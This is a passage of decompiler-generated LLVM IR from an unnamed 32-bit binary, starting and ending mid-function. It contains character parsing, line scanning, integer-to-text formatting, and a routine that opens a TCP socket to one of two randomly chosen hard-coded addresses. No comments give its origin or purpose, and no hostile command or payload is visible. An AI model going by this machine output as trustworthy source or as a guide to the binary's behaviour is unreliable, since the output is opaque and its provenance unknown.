  %v3_40424c = add nuw nsw i32 %v1_40423c, 191
  br i1 %v1_40424c, label %dec_label_pc_40425c, label %dec_label_pc_404250

dec_label_pc_404250:                              ; preds = %dec_label_pc_404210
  %v1_404258 = add nsw i32 %v3_404214, -48
  br label %dec_label_pc_40425c

dec_label_pc_40425c:                              ; preds = %dec_label_pc_404210, %dec_label_pc_404250
  %v0_40426c = phi i32 [ %v1_40423c, %dec_label_pc_404210 ], [ %v1_404258, %dec_label_pc_404250 ]
  %v1_40425c = and i32 %v3_40424c, 254
  %v1_404260 = icmp ult i32 %v1_40425c, 26
  br i1 %v1_404260, label %dec_label_pc_404280, label %dec_label_pc_404268

dec_label_pc_404268:                              ; preds = %dec_label_pc_40425c
  %v1_40426c = add nsw i32 %v0_40426c, 159
  %v1_404270 = and i32 %v1_40426c, 254
  %v1_404274 = icmp ult i32 %v1_404270, 26
  %v1_404278 = icmp eq i1 %v1_404274, false
  br i1 %v1_404278, label %dec_label_pc_4042fc, label %dec_label_pc_404280

dec_label_pc_404280:                              ; preds = %dec_label_pc_404268, %dec_label_pc_40425c
  %v1_404280 = phi i32 [ 87, %dec_label_pc_404268 ], [ 55, %dec_label_pc_40425c ]
  %v2_404280 = sub nsw i32 %v3_404214, %v1_404280
  %v3_404284 = icmp slt i32 %v2_404280, %tmp
  %v4_404284 = zext i1 %v3_404284 to i32
  %v1_404288 = icmp eq i1 %v3_404284, false
  br i1 %v1_404288, label %dec_label_pc_4042fc, label %dec_label_pc_40429c

dec_label_pc_40429c:                              ; preds = %dec_label_pc_404280
  br i1 %v2_4042a0, label %dec_label_pc_4042a4, label %dec_label_pc_4042b4

dec_label_pc_4042a4:                              ; preds = %dec_label_pc_40429c
  %v2_4042a8 = icmp slt i32 %v7_404220, %v2_404280
  br i1 %v2_4042a8, label %dec_label_pc_4042ec, label %dec_label_pc_4042b4

dec_label_pc_4042b4:                              ; preds = %dec_label_pc_4042a4, %dec_label_pc_40429c
  br label %dec_label_pc_4042ec

dec_label_pc_4042ec:                              ; preds = %dec_label_pc_4042a4, %dec_label_pc_4042b4
  %v1_4042d0 = add i32 %v0_404214, 2
  br label %dec_label_pc_4042fc

dec_label_pc_4042fc:                              ; preds = %dec_label_pc_404268, %dec_label_pc_404280, %dec_label_pc_4042ec
  %v0_404214824 = phi i32 [ %v1_4042d0, %dec_label_pc_4042ec ], [ %v1_40421c, %dec_label_pc_404280 ], [ %v1_40421c, %dec_label_pc_404268 ]
  %v0_40430823 = phi i32 [ %v2_404280, %dec_label_pc_4042ec ], [ %v2_404280, %dec_label_pc_404280 ], [ %v0_40426c, %dec_label_pc_404268 ]
  %v1_404308 = phi i32 [ 2147418112, %dec_label_pc_4042ec ], [ %v4_404284, %dec_label_pc_404280 ], [ 87, %dec_label_pc_404268 ]
  %v0_404304 = phi i32 [ 2147483647, %dec_label_pc_4042ec ], [ 0, %dec_label_pc_404280 ], [ 0, %dec_label_pc_404268 ]
  %v1_404304 = sub nsw i32 0, %v0_404304
  %v2_404308 = icmp eq i32 %v0_40430823, %v1_404308
  br i1 %v2_404308, label %dec_label_pc_404328, label %dec_label_pc_404208

dec_label_pc_404328:                              ; preds = %dec_label_pc_404208, %dec_label_pc_4042fc
  %v1_40432822 = phi i32 [ %v1_404304, %dec_label_pc_4042fc ], [ %v1_40432820, %dec_label_pc_404208 ]
  ret i32 %v1_40432822

; uselistorder directives
  uselistorder i32 %v1_404304, { 1, 0 }
  uselistorder i32 %v1_40423c, { 1, 0 }
  uselistorder i32 %v3_404214, { 1, 2, 3, 0 }
  uselistorder i32 %v0_404214, { 0, 2, 1 }
  uselistorder i32 %v1_4041d4, { 2, 1, 0 }
  uselistorder i8 %v2_4041d0, { 1, 0, 2 }
  uselistorder i32 %v0_4041d0, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 2, 0 }
  uselistorder i32 43, { 1, 2, 0 }
  uselistorder i8 9, { 1, 0 }
  uselistorder label %dec_label_pc_404328, { 1, 0 }
  uselistorder label %dec_label_pc_4042fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_4042ec, { 1, 0 }
  uselistorder label %dec_label_pc_40425c, { 1, 0 }
  uselistorder label %dec_label_pc_4041d0, { 2, 1, 0, 3 }
}

define i32 @function_404330(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404330:
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %s1.global-to-local, align 4
  store i32 %arg2, i32* %s4.global-to-local, align 4
  store i32 %arg3, i32* %s3.global-to-local, align 4
  store i32 %tmp, i32* @s0, align 4
  store i32 0, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_404370

dec_label_pc_404370:                              ; preds = %dec_label_pc_4043a4.dec_label_pc_404370_crit_edge, %dec_label_pc_404330
  %v0_404378 = phi i32 [ %v0_404378.pre, %dec_label_pc_4043a4.dec_label_pc_404370_crit_edge ], [ %arg3, %dec_label_pc_404330 ]
  %v0_404374 = phi i32 [ %v4_404390, %dec_label_pc_4043a4.dec_label_pc_404370_crit_edge ], [ %tmp, %dec_label_pc_404330 ]
  %v3_404370 = load i32, i32* @global_var_449b6c.174, align 4
  store i32 %v3_404370, i32* @t9, align 4
  %tmp14 = inttoptr i32 %v0_404374 to i32*
  %v6_40437c = call i32 @function_405050(i32 %v0_404378, i32* %tmp14, i32 1)
  %v0_404388 = load i32, i32* @s0, align 4
  %v2_404390 = icmp eq i32 %v6_40437c, 1
  %v4_404390 = add i32 %v0_404388, 1
  store i32 %v4_404390, i32* @s0, align 4
  %v0_404398 = load i32, i32* %s2.global-to-local, align 4
  br i1 %v2_404390, label %dec_label_pc_404394, label %dec_label_pc_4043b8

dec_label_pc_404394:                              ; preds = %dec_label_pc_404370
  %v1_404398 = add i32 %v0_404398, 1
  store i32 %v1_404398, i32* %s2.global-to-local, align 4
  %v1_40439c = load i32, i32* %s4.global-to-local, align 4
  %v2_40439c = icmp slt i32 %v1_404398, %v1_40439c
  %v1_4043a0 = icmp eq i1 %v2_40439c, false
  br i1 %v1_4043a0, label %dec_label_pc_4043b8, label %dec_label_pc_4043a4

dec_label_pc_4043a4:                              ; preds = %dec_label_pc_404394
  %v1_4043a8 = inttoptr i32 %v0_404388 to i8*
  %v2_4043a8 = load i8, i8* %v1_4043a8, align 1
  %v2_4043b0 = icmp eq i8 %v2_4043a8, 10
  br i1 %v2_4043b0, label %dec_label_pc_4043b8, label %dec_label_pc_4043a4.dec_label_pc_404370_crit_edge

dec_label_pc_4043a4.dec_label_pc_404370_crit_edge: ; preds = %dec_label_pc_4043a4
  %v0_404378.pre = load i32, i32* %s3.global-to-local, align 4
  br label %dec_label_pc_404370

dec_label_pc_4043b8:                              ; preds = %dec_label_pc_404370, %dec_label_pc_404394, %dec_label_pc_4043a4
  %v0_4043b8 = phi i32 [ %v1_404398, %dec_label_pc_4043a4 ], [ %v1_404398, %dec_label_pc_404394 ], [ %v0_404398, %dec_label_pc_404370 ]
  %v1_4043b8 = icmp eq i32 %v0_4043b8, 0
  %v2_4043b8 = load i32, i32* %s1.global-to-local, align 4
  br i1 %v1_4043b8, label %dec_label_pc_4043bc, label %dec_label_pc_4043c8

dec_label_pc_4043bc:                              ; preds = %dec_label_pc_4043b8
  store i32 0, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_4043c8

dec_label_pc_4043c8:                              ; preds = %dec_label_pc_4043b8, %dec_label_pc_4043bc
  %v4_4043e0 = phi i32 [ %v2_4043b8, %dec_label_pc_4043b8 ], [ 0, %dec_label_pc_4043bc ]
  ret i32 %v4_4043e0

; uselistorder directives
  uselistorder i32 %v4_404390, { 1, 0 }
  uselistorder label %dec_label_pc_4043c8, { 1, 0 }
  uselistorder label %dec_label_pc_4043b8, { 2, 1, 0 }
}

define i32 @function_4043e8() local_unnamed_addr {
dec_label_pc_4043e8:
  %v3_404400 = load i32, i32* @global_var_449bc4.100, align 4
  store i32 %v3_404400, i32* @t9, align 4
  %v1_404408 = call i32 @function_401d34()
  %v1_404410 = urem i32 %v1_404408, 2
  %v1_40441c = icmp eq i32 %v1_404410, 0
  %. = select i1 %v1_40441c, i32 -1376437608, i32 -1376437316
  ret i32 %.

; uselistorder directives
  uselistorder i32 ()* @function_401d34, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_404448() local_unnamed_addr {
dec_label_pc_404448:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v0_404460 = load i32, i32* @s0, align 4
  %v3_404468 = load i32, i32* @global_var_449bf4.78, align 4
  store i32 %v3_404468, i32* @t9, align 4
  store i32 16, i32* %stack_var_-40, align 4
  %v4_40447c = call i32 @function_405f50(i32 2, i32 1, i32 0)
  store i32 %v4_40447c, i32* @s0, align 4
  %v3_404494 = load i32, i32* @global_var_449b00.119, align 4
  store i32 %v3_404494, i32* @t9, align 4
  %v2_404498 = icmp eq i32 %v4_40447c, -1
  br i1 %v2_404498, label %dec_label_pc_404518, label %dec_label_pc_40449c

dec_label_pc_40449c:                              ; preds = %dec_label_pc_404448
  store i32 2, i32* %stack_var_-36, align 4
  %v6_4044a4 = call i32 @function_4043e8()
  %v3_4044b4 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_4044b4, i32* @t9, align 4
  %v6_4044bc = call i32 @function_4056e0()
  store i32 16, i32* @a2, align 4
  %v3_4044cc = load i32, i32* @global_var_449c60.86, align 4
  store i32 %v3_4044cc, i32* @t9, align 4
  %v0_4044d0 = load i32, i32* @s0, align 4
  %v2_4044d8 = inttoptr i32 %v6_4044bc to i32*
  store i32 0, i32* %v2_4044d8, align 4
  %v6_4044d8 = bitcast i32* %stack_var_-36 to %sockaddr*
  %v7_4044d8 = call i32 @function_405bf0(i32 %v0_4044d0, %sockaddr* %v6_4044d8)
  %v0_4044e4 = load i32, i32* @s0, align 4
  %v3_4044e8 = load i32, i32* @global_var_449a60.175, align 4
  store i32 %v3_4044e8, i32* @t9, align 4
  %v3_4044f0 = ptrtoint i32* %stack_var_-40 to i32
  %v8_4044f0 = call i32 @function_405c50(i32 %v0_4044e4, %sockaddr* %v6_4044d8, i32 %v3_4044f0)
  %v3_404500 = load i32, i32* @global_var_449a6c.60, align 4
  store i32 %v3_404500, i32* @t9, align 4
  %v1_404508 = load i32, i32* @s0, align 4
  %v3_404508 = call i32 @function_404d20(i32 %v1_404508)
  br label %dec_label_pc_404518

dec_label_pc_404518:                              ; preds = %dec_label_pc_404448, %dec_label_pc_40449c
  %v0_404524 = phi i32 [ 0, %dec_label_pc_404448 ], [ %v6_4044a4, %dec_label_pc_40449c ]
  store i32 %v0_404460, i32* @s0, align 4
  ret i32 %v0_404524

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 ()* @function_4043e8, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_405f50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_404518, { 1, 0 }
}

define i32 @function_404530(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404530:
  %v1.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg2 to i8
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_4 = alloca i8, align 1
  store i32 %tmp2, i32* %v1.global-to-local, align 4
  %v3_40454c = load i32, i32* @global_var_449ba4.93, align 4
  store i32 %v3_40454c, i32* @t9, align 4
  store i32 1, i32* @a2, align 4
  %v1_404558 = icmp eq i32* %arg1, null
  store i8 %tmp, i8* %stack_var_4, align 1
  br i1 %v1_404558, label %dec_label_pc_404580, label %dec_label_pc_40455c

dec_label_pc_40455c:                              ; preds = %dec_label_pc_404530
  %v2_404560 = load i32, i32* %arg1, align 4
  %v4_404568 = inttoptr i32 %v2_404560 to i8*
  store i8 %tmp, i8* %v4_404568, align 1
  %v0_40456c = load i32, i32* %v1.global-to-local, align 4
  %v1_40456c = inttoptr i32 %v0_40456c to i32*
  %v2_40456c = load i32, i32* %v1_40456c, align 4
  %v1_404574 = add i32 %v2_40456c, 1
  store i32 %v1_404574, i32* %v1_40456c, align 4
  br label %dec_label_pc_404580

dec_label_pc_404580:                              ; preds = %dec_label_pc_404530, %dec_label_pc_40455c
  %v3_404580 = ptrtoint i8* %stack_var_4 to i32
  %v6_404580 = bitcast i8* %stack_var_4 to i32*
  %v7_404580 = call i32 @function_4052b0(i32 %v3_404580, i32* %v6_404580)
  ret i32 %v7_404580

; uselistorder directives
  uselistorder label %dec_label_pc_404580, { 1, 0 }
}

define i32 @function_40459c(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_40459c:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg3, i32* %s0.global-to-local, align 4
  %v1_4045d0 = icmp slt i32 %arg3, 1
  store i32 %tmp, i32* %s1.global-to-local, align 4
  br i1 %v1_4045d0, label %dec_label_pc_40461c, label %dec_label_pc_4045d4

dec_label_pc_4045d4:                              ; preds = %dec_label_pc_40459c
  br label %dec_label_pc_4045e4

dec_label_pc_4045e4:                              ; preds = %dec_label_pc_4045e4, %dec_label_pc_4045d4
  %v0_4045e8 = phi i32 [ %v3_4045f0, %dec_label_pc_4045e4 ], [ %tmp, %dec_label_pc_4045d4 ]
  %v0_4045e4 = phi i32 [ %v1_4045e4, %dec_label_pc_4045e4 ], [ 0, %dec_label_pc_4045d4 ]
  %v1_4045e4 = add i32 %v0_4045e4, 1
  %v1_4045e8 = inttoptr i32 %v0_4045e8 to i8*
  %v2_4045e8 = load i8, i8* %v1_4045e8, align 1
  %v1_4045f0 = icmp eq i8 %v2_4045e8, 0
  %v3_4045f0 = add i32 %v0_4045e8, 1
  br i1 %v1_4045f0, label %dec_label_pc_4045f4, label %dec_label_pc_4045e4

dec_label_pc_4045f4:                              ; preds = %dec_label_pc_4045e4
  %v2_4045f8 = icmp slt i32 %v1_4045e4, %arg3
  br i1 %v2_4045f8, label %dec_label_pc_40460c, label %dec_label_pc_404600

dec_label_pc_404600:                              ; preds = %dec_label_pc_4045f4
  store i32 0, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_40460c

dec_label_pc_40460c:                              ; preds = %dec_label_pc_4045f4, %dec_label_pc_404600
  %v0_40460c = phi i32 [ %arg3, %dec_label_pc_4045f4 ], [ 0, %dec_label_pc_404600 ]
  %v2_40460c = sub i32 %v0_40460c, %v1_4045e4
  store i32 %v2_40460c, i32* %s0.global-to-local, align 4
  %v1_404610 = and i32 %arg4, 2
  %v1_404614 = icmp eq i32 %v1_404610, 0
  br i1 %v1_404614, label %dec_label_pc_40461c, label %dec_label_pc_404620

dec_label_pc_40461c:                              ; preds = %dec_label_pc_40460c, %dec_label_pc_40459c
  br label %dec_label_pc_404620

dec_label_pc_404620:                              ; preds = %dec_label_pc_40460c, %dec_label_pc_40461c
  %v1_404620 = urem i32 %arg4, 2
  %v1_404624 = icmp eq i32 %v1_404620, 0
  br i1 %v1_404624, label %dec_label_pc_404634, label %dec_label_pc_404628

dec_label_pc_404628:                              ; preds = %dec_label_pc_404620
  store i32 0, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_404634

dec_label_pc_404634:                              ; preds = %dec_label_pc_404620, %dec_label_pc_404628
  store i32 0, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_40463c

dec_label_pc_40463c:                              ; preds = %dec_label_pc_40463c.dec_label_pc_40463c_crit_edge, %dec_label_pc_404634
  %v1_404648 = phi i32 [ %v1_404648.pre, %dec_label_pc_40463c.dec_label_pc_40463c_crit_edge ], [ 0, %dec_label_pc_404634 ]
  %v3_40463c = load i32, i32* @global_var_4499d0.88, align 4
  %v1_404644 = add i32 %v3_40463c, 17712
  %v2_404648 = add i32 %v1_404648, 1
  store i32 %v2_404648, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_404644)
  %v0_404654 = load i32, i32* %s0.global-to-local, align 4
  %v1_404654 = add i32 %v0_404654, -1
  store i32 %v1_404654, i32* %s0.global-to-local, align 4
  %v1_40465c = icmp sgt i32 %v1_404654, 0
  br i1 %v1_40465c, label %dec_label_pc_40463c.dec_label_pc_40463c_crit_edge, label %dec_label_pc_40466c

dec_label_pc_40463c.dec_label_pc_40463c_crit_edge: ; preds = %dec_label_pc_40463c
  %v1_404648.pre = load i32, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_40463c

dec_label_pc_40466c:                              ; preds = %dec_label_pc_40463c, %dec_label_pc_40466c
  %v3_40466c = load i32, i32* @global_var_4499d0.88, align 4
  %v1_404674 = add i32 %v3_40466c, 17712
  %v1_404678 = load i32, i32* %s2.global-to-local, align 4
  %v2_404678 = add i32 %v1_404678, 1
  store i32 %v2_404678, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_404674)
  %v0_404684 = load i32, i32* %s1.global-to-local, align 4
  %v1_404684 = inttoptr i32 %v0_404684 to i8*
  %v2_404684 = load i8, i8* %v1_404684, align 1
  %v1_404690 = icmp eq i8 %v2_404684, 0
  %v3_404690 = add i32 %v0_404684, 1
  store i32 %v3_404690, i32* %s1.global-to-local, align 4
  br i1 %v1_404690, label %dec_label_pc_404694, label %dec_label_pc_40466c

dec_label_pc_404694:                              ; preds = %dec_label_pc_40466c
  %v1_4046ac.pre = load i32, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_4046a0

dec_label_pc_4046a0:                              ; preds = %dec_label_pc_4046a0, %dec_label_pc_404694
  %v1_4046ac = phi i32 [ %v2_4046ac, %dec_label_pc_4046a0 ], [ %v1_4046ac.pre, %dec_label_pc_404694 ]
  %v3_4046a0 = load i32, i32* @global_var_4499d0.88, align 4
  %v1_4046a8 = add i32 %v3_4046a0, 17712
  %v2_4046ac = add i32 %v1_4046ac, 1
  store i32 %v2_4046ac, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4046a8)
  %v0_4046b8 = load i32, i32* %s0.global-to-local, align 4
  %v1_4046b8 = add i32 %v0_4046b8, -1
  store i32 %v1_4046b8, i32* %s0.global-to-local, align 4
  %v1_4046c4 = icmp sgt i32 %v1_4046b8, 0
  br i1 %v1_4046c4, label %dec_label_pc_4046a0, label %dec_label_pc_4046c8

dec_label_pc_4046c8:                              ; preds = %dec_label_pc_4046a0
  ret i32 %v2_4046ac

; uselistorder directives
  uselistorder i32 %v2_4046ac, { 1, 2, 0 }
  uselistorder i32 %v0_4045e8, { 1, 0 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_40466c, { 1, 0 }
  uselistorder label %dec_label_pc_404634, { 1, 0 }
  uselistorder label %dec_label_pc_404620, { 1, 0 }
  uselistorder label %dec_label_pc_40460c, { 1, 0 }
}

define i32 @function_4046ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4046ec:
  %a1.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  %stack_var_-29 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_4046f4 = load i32, i32* @t9, align 4
  %v2_4046f4 = add i32 %v1_4046f4, 316100
  store i32 %v2_4046f4, i32* %gp.global-to-local, align 4
  store i32 %arg3, i32* %s2.global-to-local, align 4
  store i32 %arg4, i32* %s3.global-to-local, align 4
  store i32 %arg5, i32* %t0.global-to-local, align 4
  %v0_404724 = load i32, i32* %a1.global-to-local, align 4
  %v1_404724 = icmp eq i32 %v0_404724, 0
  br i1 %v1_404724, label %dec_label_pc_404728, label %dec_label_pc_40475c

dec_label_pc_404728:                              ; preds = %dec_label_pc_4046ec
  %v3_40472c = load i32, i32* @global_var_4499d0.88, align 4
  store i32 48, i32* %v0.global-to-local, align 4
  store i32 %arg3, i32* @a2, align 4
  store i32 %arg4, i32* @a3, align 4
  %v2_40473c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_40473c, i32* %a1.global-to-local, align 4
  store i32 48, i32* %stack_var_-40, align 4
  %v1_404744 = add i32 %v3_40472c, 17820
  call void @__pseudo_call(i32 %v1_404744)
  store i32 %v2_4046f4, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_40475c

dec_label_pc_40475c:                              ; preds = %dec_label_pc_4046ec, %dec_label_pc_404728
  %v0_40475c = load i32, i32* @a3, align 4
  %v1_40475c = icmp eq i32 %v0_40475c, 0
  store i32 10, i32* %v0.global-to-local, align 4
  br i1 %v1_40475c, label %dec_label_pc_40475c.dec_label_pc_404780_crit_edge, label %dec_label_pc_404760

dec_label_pc_40475c.dec_label_pc_404780_crit_edge: ; preds = %dec_label_pc_40475c
  %v2_404790.pre.pre.pre = load i32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_404780

dec_label_pc_404760:                              ; preds = %dec_label_pc_40475c
  %v0_404764 = load i32, i32* @a2, align 4
  %v2_404764 = icmp ne i32 %v0_404764, 10
  store i32 0, i32* %a3.global-to-local, align 4
  %v0_40476c = load i32, i32* %a1.global-to-local, align 4
  %v1_40476c = icmp sgt i32 %v0_40476c, -1
  %or.cond = or i1 %v2_404764, %v1_40476c
  br i1 %or.cond, label %dec_label_pc_404784, label %dec_label_pc_404770

dec_label_pc_404770:                              ; preds = %dec_label_pc_404760
  %v1_404774 = sub i32 0, %v0_40476c
  store i32 %v1_404774, i32* %a1.global-to-local, align 4
  store i32 1, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_404780

dec_label_pc_404780:                              ; preds = %dec_label_pc_40475c.dec_label_pc_404780_crit_edge, %dec_label_pc_404770
  %v2_404790.pre.pre = phi i32 [ %v2_404790.pre.pre.pre, %dec_label_pc_40475c.dec_label_pc_404780_crit_edge ], [ %v1_404774, %dec_label_pc_404770 ]
  store i32 0, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_404784

dec_label_pc_404784:                              ; preds = %dec_label_pc_404760, %dec_label_pc_404780
  %v2_404790.pre = phi i32 [ %v0_40476c, %dec_label_pc_404760 ], [ %v2_404790.pre.pre, %dec_label_pc_404780 ]
  %v2_404784 = ptrtoint i32* %stack_var_-29 to i32
  store i32 %v2_404784, i32* %s0.global-to-local, align 4
  store i32 0, i32* %stack_var_-29, align 4
  br label %dec_label_pc_404790

dec_label_pc_404790:                              ; preds = %dec_label_pc_4047bc.dec_label_pc_404790_crit_edge, %dec_label_pc_404784
  %v0_40479c = phi i32 [ %v0_40479c.pre, %dec_label_pc_4047bc.dec_label_pc_404790_crit_edge ], [ %v2_404784, %dec_label_pc_404784 ]
  %v2_404790 = phi i32 [ %v0_4047c4, %dec_label_pc_4047bc.dec_label_pc_404790_crit_edge ], [ %v2_404790.pre, %dec_label_pc_404784 ]
  %v0_404790 = load i32, i32* @a2, align 4
  %v4_404790 = udiv i32 %v2_404790, %v0_404790
  %v5_404790 = urem i32 %v2_404790, %v0_404790
  %v1_40479c = add i32 %v0_40479c, -1
  store i32 %v1_40479c, i32* %s0.global-to-local, align 4
  store i32 %v5_404790, i32* %v0.global-to-local, align 4
  store i32 %v4_404790, i32* %a1.global-to-local, align 4
  %v1_4047ac = icmp slt i32 %v5_404790, 10
  %v2_4047ac = zext i1 %v1_4047ac to i32
  store i32 %v2_4047ac, i32* %v1.global-to-local, align 4
  br i1 %v1_4047ac, label %dec_label_pc_4047bc, label %dec_label_pc_4047b4

dec_label_pc_4047b4:                              ; preds = %dec_label_pc_404790
  %v3_4047b0 = load i32, i32* %t0.global-to-local, align 4
  %v4_4047b0 = add i32 %v3_4047b0, %v5_404790
  %v1_4047b8 = add i32 %v4_4047b0, -58
  store i32 %v1_4047b8, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4047bc

dec_label_pc_4047bc:                              ; preds = %dec_label_pc_404790, %dec_label_pc_4047b4
  %v0_4047bc = phi i32 [ %v5_404790, %dec_label_pc_404790 ], [ %v1_4047b8, %dec_label_pc_4047b4 ]
  %v1_4047bc = add i32 %v0_4047bc, 48
  store i32 %v1_4047bc, i32* %v0.global-to-local, align 4
  %v1_4047c0 = trunc i32 %v1_4047bc to i8
  %v3_4047c0 = inttoptr i32 %v1_40479c to i8*
  store i8 %v1_4047c0, i8* %v3_4047c0, align 1
  %v0_4047c4 = load i32, i32* %a1.global-to-local, align 4
  %v1_4047c4 = icmp eq i32 %v0_4047c4, 0
  br i1 %v1_4047c4, label %dec_label_pc_4047c8, label %dec_label_pc_4047bc.dec_label_pc_404790_crit_edge

dec_label_pc_4047bc.dec_label_pc_404790_crit_edge: ; preds = %dec_label_pc_4047bc
  %v0_40479c.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404790

dec_label_pc_4047c8:                              ; preds = %dec_label_pc_4047bc
  %v0_4047cc = load i32, i32* %a3.global-to-local, align 4
  %v1_4047cc = icmp eq i32 %v0_4047cc, 0
  %v2_4047cc = load i32, i32* %s0.global-to-local, align 4
  store i32 %v2_4047cc, i32* %v1.global-to-local, align 4
  br i1 %v1_4047cc, label %dec_label_pc_404814, label %dec_label_pc_4047d0

dec_label_pc_4047d0:                              ; preds = %dec_label_pc_4047c8
  %v0_4047d4 = load i32, i32* %s2.global-to-local, align 4
  %v1_4047d4 = icmp eq i32 %v0_4047d4, 0
  store i32 45, i32* %v0.global-to-local, align 4
  br i1 %v1_4047d4, label %dec_label_pc_40480c, label %dec_label_pc_4047d8

dec_label_pc_4047d8:                              ; preds = %dec_label_pc_4047d0
  %v0_4047dc = load i32, i32* %s3.global-to-local, align 4
  %v1_4047dc = and i32 %v0_4047dc, 2
  %v1_4047e0 = icmp eq i32 %v1_4047dc, 0
  store i32 45, i32* %v0.global-to-local, align 4
  br i1 %v1_4047e0, label %dec_label_pc_40480c, label %dec_label_pc_4047e4

dec_label_pc_4047e4:                              ; preds = %dec_label_pc_4047d8
  %v3_4047e8 = load i32, i32* @global_var_4499d0.88, align 4
  %v1_4047f0 = add i32 %v3_4047e8, 17712
  store i32 45, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4047f0)
  store i32 %v2_4046f4, i32* %gp.global-to-local, align 4
  %v0_404800 = load i32, i32* %s2.global-to-local, align 4
  %v1_404800 = add i32 %v0_404800, -1
  store i32 %v1_404800, i32* %s2.global-to-local, align 4
  store i32 1, i32* %s1.global-to-local, align 4
  %v0_40480c.pre = load i32, i32* %v0.global-to-local, align 4
  %v2_40480c.pre = load i32, i32* %v1.global-to-local, align 4
  %extract.t = trunc i32 %v0_40480c.pre to i8
  br label %dec_label_pc_40480c

dec_label_pc_40480c:                              ; preds = %dec_label_pc_4047d8, %dec_label_pc_4047d0, %dec_label_pc_4047e4
  %v2_40480c = phi i32 [ %v2_4047cc, %dec_label_pc_4047d8 ], [ %v2_4047cc, %dec_label_pc_4047d0 ], [ %v2_40480c.pre, %dec_label_pc_4047e4 ]
  %v0_40480c.off0 = phi i8 [ 45, %dec_label_pc_4047d8 ], [ 45, %dec_label_pc_4047d0 ], [ %extract.t, %dec_label_pc_4047e4 ]
  %v3_40480c = add i32 %v2_40480c, -1
  %v4_40480c = inttoptr i32 %v3_40480c to i8*
  store i8 %v0_40480c.off0, i8* %v4_40480c, align 1
  %v0_404810 = load i32, i32* %s0.global-to-local, align 4
  %v1_404810 = add i32 %v0_404810, -1
  store i32 %v1_404810, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404814

dec_label_pc_404814:                              ; preds = %dec_label_pc_4047c8, %dec_label_pc_40480c
  %v0_404820 = phi i32 [ %v2_4047cc, %dec_label_pc_4047c8 ], [ %v1_404810, %dec_label_pc_40480c ]
  store i32 0, i32* %s1.global-to-local, align 4
  %v0_404818 = load i32, i32* %gp.global-to-local, align 4
  %v1_404818 = add i32 %v0_404818, -32736
  %v2_404818 = inttoptr i32 %v1_404818 to i32*
  %v3_404818 = load i32, i32* %v2_404818, align 4
  store i32 %v0_404820, i32* %a1.global-to-local, align 4
  %v1_404828 = add i32 %v3_404818, 17820
  %v1_40482c = load i32, i32* %s3.global-to-local, align 4
  store i32 %v1_40482c, i32* %a3.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_404828)
  store i32 %v2_4046f4, i32* %gp.global-to-local, align 4
  %v0_404838 = load i32, i32* %s1.global-to-local, align 4
  %v1_404838 = load i32, i32* %v0.global-to-local, align 4
  %v2_404838 = add i32 %v1_404838, %v0_404838
  store i32 %v2_404838, i32* %v0.global-to-local, align 4
  ret i32 %v2_404838

; uselistorder directives
  uselistorder i32 %v0_4047c4, { 1, 0 }
  uselistorder i32 %v5_404790, { 1, 0, 3, 2 }
  uselistorder i32 %v0_404790, { 1, 0 }
  uselistorder i32 %v2_404790, { 1, 0 }
  uselistorder i32 %v2_4046f4, { 1, 2, 0, 3 }
  uselistorder i32* %v0.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %s0.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %gp.global-to-local, { 0, 3, 1, 2, 4 }
